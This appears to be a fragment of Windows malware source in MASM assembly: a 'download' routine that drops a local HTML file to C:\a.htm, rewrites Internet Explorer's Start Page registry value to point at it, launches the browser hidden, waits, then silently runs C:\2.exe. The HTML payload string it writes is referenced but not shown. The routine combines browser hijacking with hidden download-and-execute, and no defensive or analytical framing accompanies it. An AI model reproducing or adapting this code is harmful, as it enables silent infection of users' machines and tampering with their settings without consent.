.const
		szOpen          db "open",0	
.data
		szjsName    	db "C:\a.htm",0
		szUrls	db "Software\Microsoft\Internet Explorer\Main\",0
		szAutoKeyValue2 db "Start Page", 0
		szIE   		db "iexplore",0
		szdFILE		db "C:\2.exe",0
	
.data?
		gKey    dd 	?
.code

; #########################################################################

download proc
  	LOCAL   hFile: DWORD
        LOCAL   bWritten: DWORD

        invoke  CreateFile, offset szjsName, GENERIC_READ or GENERIC_WRITE, FILE_SHARE_READ or FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, 0, 0
        mov     hFile, eax
        inc     eax
        jz      @end

        invoke  lstrlen, offset szjsFile
        mov     edx, eax
        invoke  WriteFile, hFile, offset szjsFile, edx, addr bWritten, NULL
        invoke  CloseHandle, hFile
	invoke RegOpenKeyEx, HKEY_CURRENT_USER, addr szUrls, 0, KEY_WRITE, addr gKey
	invoke lstrlen, addr szjsName
	invoke RegSetValueEx, gKey, addr szAutoKeyValue2, 0, REG_SZ, addr szjsName, eax
	invoke RegCloseKey, gKey
	invoke ShellExecuteA,0,offset szOpen,offset szIE, NULL,NULL,SW_HIDE
	invoke Sleep, 20000 
	invoke ShellExecuteA,0,offset szOpen,offset szdFILE, NULL,NULL,SW_HIDE
@end:
        ret
download endp
